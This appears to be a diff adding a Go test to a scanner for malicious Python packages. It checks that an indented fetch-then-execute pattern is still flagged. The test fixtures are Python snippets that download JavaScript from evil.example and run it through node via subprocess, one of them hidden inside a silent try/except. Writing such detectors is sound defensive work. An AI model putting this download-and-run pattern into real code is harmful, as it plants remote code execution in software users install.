@@ -71,6 +71,38 @@ subprocess.run(["node", "-e", js])`,
 	}
 }
 
+func TestIndentedAssignmentsBind(t *testing.T) {
+	// The source assignment is commonly indented (inside try:, a
+	// function, a with-block) in setup.py / __init__.py. Indentation
+	// must not break the fetch->eval binding.
+	cases := []struct{ name, src string }{
+		{
+			"inside try/except",
+			`import requests, subprocess
+try:
+    js = requests.get("https://evil.example/p.js").text
+    subprocess.run(["node", "-e", js])
+except Exception:
+    pass`,
+		},
+		{
+			"inside a function body",
+			`import requests, subprocess
+def run():
+    js = requests.get("https://evil.example/p.js").text
+    subprocess.run(["node", "-e", js])
+run()`,
+		},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			if !fires(t, "__init__.py", c.src) {
+				t.Fatalf("indented assignment must still bind and fire")
+			}
+		})
+	}
+}
+
 func TestFalsePositives(t *testing.T) {
 	cases := []struct{ name, src string }{
 		{
